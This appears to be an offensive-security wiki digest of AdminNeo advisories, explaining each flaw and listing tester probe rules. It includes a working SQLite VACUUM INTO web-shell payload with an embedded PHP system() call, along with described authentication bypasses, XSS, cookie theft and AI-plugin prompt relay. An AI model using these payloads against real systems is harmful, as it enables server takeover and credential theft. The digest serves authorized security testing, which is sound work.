---
title: AdminNeo coordinated wave, ATTACH blocklist bypass to web shell, token self-disclosure, nonce-carrying XSS, and the follow-up-fix family
---

# AdminNeo coordinated wave, ATTACH blocklist bypass to web shell, token self-disclosure…

Source: hourly offensive-security scan of GitHub Security Advisories, 2026-11-06 (catch-up over the Oct 28 - Nov 6 gap; eight advisories published 2026-10-30T18:53Z-22:53Z, all fixed in AdminNeo 5.5.1).

AdminNeo is the maintained fork of Adminer, which makes this wave doubly valuable as an operator map, because almost every leg explicitly credits an earlier Adminer advisory it re-introduces or bypasses. **A fork is a snapshot of its upstream's bug history; re-run the upstream's whole advisory corpus against the fork.** Every advisory below links its Adminer predecessor GHSA, collect the pair and diff the fix.

## Advisory table

| GHSA | CVE | Severity | Leg |
| --- | --- | --- | --- |
| [GHSA-q5mp-gfjf-cf2j](https://github.com/advisories/GHSA-q5mp-gfjf-cf2j) | [CVE-2026-96630](https://nvd.nist.gov/vuln/detail/CVE-2026-96630) | high | SQLite `VACUUM INTO` writes a web shell past the `ATTACH` blocklist |
| [GHSA-p96f-p2p2-2g3h](https://github.com/advisories/GHSA-p96f-p2p2-2g3h) | [CVE-2026-96634](https://nvd.nist.gov/vuln/detail/CVE-2026-96634) | moderate | catastrophic backtracking in the `$space*+ATTACH\b` regex = ReDoS-shaped blocklist bypass of CVE-2021-43008's fix |
| [GHSA-wm25-49w3-5qrg](https://github.com/advisories/GHSA-wm25-49w3-5qrg) | [CVE-2026-96629](https://nvd.nist.gov/vuln/detail/CVE-2026-96629) | moderate | CSRF token transmits mask and masked value in one string; session secret ~20 bits |
| [GHSA-rx7m-wxwq-vxr9](https://github.com/advisories/GHSA-rx7m-wxwq-vxr9) | [CVE-2026-96632](https://nvd.nist.gov/vuln/detail/CVE-2026-96632) | high | rogue MySQL server version string breaks out of a **nonce-carrying** `<script>` tag |
| [GHSA-79wv-8rh2-9vp2](https://github.com/advisories/GHSA-79wv-8rh2-9vp2) | [CVE-2026-96631](https://nvd.nist.gov/vuln/detail/CVE-2026-96631) | high | unsanitized `X-Forwarded-Prefix` prepended to `REQUEST_URI`, later echoed raw into hand-built `Set-Cookie` headers = `Domain=.evil.com` cookie theft |
| [GHSA-6vfx-w7q3-42gq](https://github.com/advisories/GHSA-6vfx-w7q3-42gq) | [CVE-2026-96633](https://nvd.nist.gov/vuln/detail/CVE-2026-96633) | high | database-list drop action `unlink()`s arbitrary paths, skipping the extension check create/rename enforce |
| [GHSA-jm85-8cpp-9cjc](https://github.com/advisories/GHSA-jm85-8cpp-9cjc) | [CVE-2026-59978](https://nvd.nist.gov/vuln/detail/CVE-2026-59978) | high | unauthenticated POST `version[]` array poisons the shared version cache with a type that 500s the whole UI for 24 h |
| [GHSA-q4f2-39gr-45jh (upstream anchor)](https://github.com/vrana/adminer/security/advisories) |, |, | Adminer predecessor corpus this fork re-inherits |

## The VACUUM INTO leg is the headline: function-neighborhood enumeration beats denylists

The `ATTACH` blocklist (the fix for the 2021 PHP-file-creation advisory) is a one-word denylist on the SQL statement head. SQLite's `VACUUM INTO '<path>'`, available since 3.27.0, does the same thing (writes an attacker-influenced database file to an arbitrary absolute path with an arbitrary extension) and is not on the list. The published chain, valid for any authenticated SQLite user:

```sql
CREATE TABLE "<?php system($_GET['c']); ?>" (i int);
VACUUM INTO '/var/www/html/shell.php';
```

The table name is attacker-chosen bytes stored verbatim in the file; PHP's parser finds the `<?php` block wherever it sits. This is the same **SQL-write-primitive to web-root** family the wiki tracks (MCP URI-to-SQL, July 10 page; AdminNeo is the cleanest single-request instance of it: no multi-hop, the file *is* the shell).

Operator rules:

1. **Blocklist-of-one → enumerate the function neighborhood.** Whenever a SQL guard denies named statements (`ATTACH`, `LOAD_FILE`, `INTO OUTFILE`), list every other statement/pragma in that engine that writes a file: `VACUUM INTO`, `ATTACH DATABASE`, `DETACH`, `.backup`, FTS virtual-table create with content tables, `readfile()`/`writefile()` CLI helpers, `COPY ... TO PROGRAM`. The guard names the author's mental model; the engine's grammar is the attack surface.
2. **Every file-write primitive needs a co-located injection carrier.** `VACUUM INTO` writes controlled bytes (the schema text), pair the traversal probe with the byte-carrier probe. The pair (write-where + write-what) is the finding; either alone is a half.
3. **Registry-of-known-shells probe:** on any authorized assessment of a DB admin panel behind SQLite, one request of `CREATE TABLE '<marker>'; VACUUM INTO '<webroot-writable path>'`, bounded to paths the web user owns, settles whether the primitive exists. Fingerprint AdminNeo/Adminer versions from the login page footer.

## The follow-up-fix family: three generations of the same blocklist, all still bypassable

- **ReDoS as a bypass mechanism** (GHSA-p96f-p2p2-2g3h): the hardened matcher `^$space*+ATTACH\b` is itself defeated, not by alternate spelling, but by *catastrophic backtracking* on crafted comment padding, so the guard's verdict becomes computationally unavailable. Third bypass of CVE-2021-43008's lineage in this wave alone. This joins the wiki's incomplete-fix corpus (Sunhillo `%0a/%26` separator re-run, Composer symlinked-bin, Copernik XInclude): **every fix generation of a guard must be fuzzed with its predecessor's full bypass vocabulary plus the new guard's own implementation weaknesses.** A guard that can be made to *hang* is a guard that can be made to *fail open*, test CPU-exhaustion inputs against validation logic, not just against parsers.
- **Two users, one crash** (GHSA-jm85-8cpp-9cjc): the version-check endpoint accepts any POST without origin validation and writes the value to a shared 24-hour cache file; an array-shaped `version[]` poisons the cache so `rawurlencode()` throws and every UI request 500s for a day. Durable axis: **client-callback endpoints that write shared server state are unauthenticated state-mutation surfaces**, probe type confusion (array vs scalar) on any endpoint whose caller is "the product's own JS."
- **CSRF token = key + key** (GHSA-wm25-49w3-5qrg): the token is `(rand XOR secret):rand`, both operands transmitted; the secret is recoverable from a single observation, and `rand(1,1e6)` is ~20 bits of entropy with loose `==` comparison on top. When a scheme publishes its own masking arithmetic in the token format, the token is the key. Probe: capture one token from your own session, XOR, confirm the recovered value forges tokens for a second disposable session; sweep for `rand(`-style session entropy in PHP admin tools generally.

## Nonce-carrying XSS and forwarded-header cookie theft

- **Rogue-server version string into a nonce'd script tag** (GHSA-rx7m-wxwq-vxr9): `Connection::get()->getVersion()` is interpolated raw into `script(...)`, which emits `<script nonce="VALID">`. The rogue MySQL server (an 80-line Python fake that accepts any login and returns a crafted version string) therefore executes inside a CSP the page itself considers trustworthy. Two durable rules: (1) **DB-server version strings are attacker-controlled input** wherever the client renders them, probe from a rogue server, not just from the UI; this is the server-side twin of header-injection-into-JS-context. (2) **A valid nonce does not sanitize the content**, CSP nonces gate *who* executes, never *what*; any sink that interpolates data inside a nonce'd tag inherits the nonce. Grep template helpers (`script(`, `nonce`) for raw interpolation of peer-supplied strings.
- **`X-Forwarded-Prefix` → `Set-Cookie` attribute injection** (GHSA-79wv-8rh2-9vp2): the header is concatenated into `REQUEST_URI` unvalidated, then the manually-built cookie header echoes it; semicolons inject `Domain=`, `Path=`, `Secure=`, `SameSite=` attributes, scoping `neo_sid` and the DB-password-encryption key cookie to an attacker domain. This is the forged-original-URI header family (Anubis `X-Original-URI`, Sept 15; NGINX ingress relay, Oct 14) with a **persistence twist: the injected header is not just trusted for this request, it is baked into stored cookie state.** Battery addition: on any app that echoes `X-Forwarded-*` into response headers, fuzz for semicolon/CR-LF and check whether the effect survives the request (cookie jar diff before/after).

## Arbitrary unlink via the un-guarded verb

GHSA-6vfx-w7q3-42gq: SQLite create/rename validate extensions (`check_sqlite_name()`); the drop path passes `db[]` straight to `unlink()`. Same validation-vs-verb parity drift the wiki scores repeatedly (Fission archive CRUD, Budibase storage): **enumerate every destructive verb on the same resource and diff each one's guard set against the write verb's.** Probe: authenticated drop request with a relative path to a canary file outside the database directory.

## Fork-inheritance sweep procedure

1. Identify the fork (AdminNeo of Adminer; any maintained fork in scope) and pull the upstream's full security-advisory list.
2. For each upstream advisory, check whether the fork's snapshot predates the fix, and whether the fork later inherited a *partial* fix (version-diff the guard functions).
3. Re-run the upstream PoCs against current fork HEAD, this wave shows the fork can reintroduce fixed bugs *and* carry unfixed bypasses of fixes it did inherit.
4. Report with both advisory links; the fork-vs-upstream diff is the evidence spine.

Validation boundary: lab instances only, disposable SQLite/MySQL backends, a rogue MySQL server bound to your own listener, marker files in directories the lab web user owns; never test shell-write primitives against third-party hosts, and redact any real credentials observed in cookie-theft proofs.

Sources: the eight advisory links above; Adminer upstream advisories at <https://github.com/vrana/adminer/security/advisories>; upstream VACUUM INTO precedent GHSA-gmx3-g29w-77wf.

## November 17 follow-up: second coordinated wave (19 GHSAs, fixed 5.9.1): driver-fallback auth bypasses, connection-string SSRF from the login form, and login-page AI plugins as open relays

The fork keeps producing. This wave attacks the **driver layer** rather than the SQL guard, and every leg reinforces the page's thesis that AdminNeo/Adminer's driver dispatch is the real attack surface.

| GHSA | CVE | Sev. | Leg |
| --- | --- | --- | --- |
| [GHSA-rv8q-c9gp-2hc7](https://github.com/advisories/GHSA-rv8q-c9gp-2hc7) | [CVE-2026-130380](https://nvd.nist.gov/vuln/detail/CVE-2026-130380) | critical | sqlsrv MS SQL driver: **empty username + any non-empty password triggers Windows integrated authentication**, session granted with the web server identity's SQL Server privileges. |
| [GHSA-c6v4-g3xv-6hpp](https://github.com/advisories/GHSA-c6v4-g3xv-6hpp) | [CVE-2026-130366](https://nvd.nist.gov/vuln/detail/CVE-2026-130366) | critical | ClickHouse driver: known `no_password` account name + any non-empty password logs in because `connect()` **skips `openPasswordless()`**, bypassing the configured `defaultPasswordHash`. |
| [GHSA-22x6-wwpc-5fx2](https://github.com/advisories/GHSA-22x6-wwpc-5fx2) | [CVE-2026-130382](https://nvd.nist.gov/vuln/detail/CVE-2026-130382) | high | OtpLoginPlugin: login with **wrong OTP + `permanent=1`** mints a `neo_permanent` cookie that replays past TOTP for full DB access (attacker needs the DB password, not the OTP). |
| [GHSA-xfph-wm76-882f](https://github.com/advisories/GHSA-xfph-wm76-882f) | [CVE-2026-130375](https://nvd.nist.gov/vuln/detail/CVE-2026-130375) | high | `check_sqlite_name()` extension guard bypassed via **PDO `file:` URI database names** (`ext=pdo`, name `file:/webroot/x.php?x=.db`): creates the .php, stores PHP source as table data, RCE. |
| [GHSA-f6j6-v8j2-pcgh](https://github.com/advisories/GHSA-f6j6-v8j2-pcgh) | [CVE-2026-130379](https://nvd.nist.gov/vuln/detail/CVE-2026-130379) | medium | Login **server field accepts separator characters/connection-string keywords**, steering pgsql/Mongo/Oracle/PDO drivers to a different host:port: privileged-port restriction bypass + internal reachability oracle via driver errors. |
| [GHSA-p7qm-f36q-6xc2](https://github.com/advisories/GHSA-p7qm-f36q-6xc2) | [CVE-2026-130361](https://nvd.nist.gov/vuln/detail/CVE-2026-130361) | high | Unencoded `db` GET parameter injects **ClickHouse HTTP query parameters**, executing attacker SQL under victim credentials; the POST-only CSRF token never covers the GET leg. |
| [GHSA-g35j-5g93-mgff](https://github.com/advisories/GHSA-g35j-5g93-mgff) | [CVE-2026-130358](https://nvd.nist.gov/vuln/detail/CVE-2026-130358) | medium | ClaudeSqlPlugin/GeminiSqlPlugin/OpenWebUiPlugin `sendHeaders()` run on the **login page**: unauthenticated POST of `claude`/`gemini`/`openwebui` fields relays arbitrary prompts on the operator's API key, including to internal Open WebUI endpoints. |
| [GHSA-c8p2-7c53-5ww9](https://github.com/advisories/GHSA-c8p2-7c53-5ww9) | [CVE-2026-130374](https://nvd.nist.gov/vuln/detail/CVE-2026-130374) | high | `process_length()` passes IN/NOT IN search values unescaped: backslash-escaped apostrophe via victim-clicked GET link = blind SQL under their DB rights (PostgreSQL, SQLite, MS SQL, Oracle, MySQL `NO_BACKSLASH_ESCAPES`). |
| [GHSA-g534-fr24-7pfx](https://github.com/advisories/GHSA-g534-fr24-7pfx) | [CVE-2026-130378](https://nvd.nist.gov/vuln/detail/CVE-2026-130378) | low | Mongo driver stringifies `_id`/search values into JS filters: stored `') OR ('` shapes make a victim's delete/edit match unintended documents (collection-wipe primitive). |

Operator rules extending this page:

- **Enumerate driver-fallback auth paths, not just the main login branch.** Both criticals are the same shape: a driver feature (Windows integrated auth, ClickHouse `no_password`) has its own admission path the app's password check never runs on. Probe battery on any DB-admin tool with pluggable drivers: empty username, known-account-name + arbitrary password, missing-password field, per-driver. The web server's own SQL identity is the prize in the sqlsrv leg: integrated auth means the *box* authenticates, so test it from the server itself during authorized engagements.
- **Connection-string fields are SSRF surfaces with a rich grammar.** Separators and driver keywords (`host=`, `port=`, `?`, backslash, comma) in the login server field reach internal services through the driver's own parser, and **driver error text is the read-back channel**. Battery per driver family, with errors recorded verbatim (redacted) as the oracle.
- **Login-page plugin hooks are unauthenticated by construction.** Anything whose `sendHeaders()` runs to render the login form is a pre-auth endpoint regardless of session state: probe every login-page extension parameter for outbound relay (AI keys, webhooks, telemetry). This is the third-member growth of the "feature renders before auth" family.
- **A CSRF guard scoped to POST is bypassed by any GET that the framework still routes to state change** (ClickHouse `db` param): for every admin action, ask what *other* HTTP verb/transport reaches the same backend, especially where the backend is a second protocol (ClickHouse HTTP params ride the driver's GET).
- **Permanent-login cookies are a second credential class; test the wrong-second-factor + remember-me combination.** `permanent=1` with an invalid OTP minting a bypass cookie is the OTP-lifecycle twin of the page's token self-disclosure legs. Battery: valid-password/wrong-OTP × `permanent` on/off × cookie replay, per 2FA plugin.
- **`file:` URI wrappers re-enter guards written for plain names.** `check_sqlite_name()` validated suffixes; `file:/webroot/x.php?x=.db` ends in `.db` and the PDO driver resolves the rest. When a guard checks a *name*, probe wrapper grammars (`file:`, `data:`, `php://`, `zip://`, drive prefixes) that keep the validated tail while changing what the sink opens.

Validation: lab AdminNeo with disposable SQLite/ClickHouse/MySQL backends, your own ClickHouse `no_password` test account, marker files in web-writable lab paths only, and mocked AI endpoints you own for the relay leg; never point driver fields at third-party internal hosts.
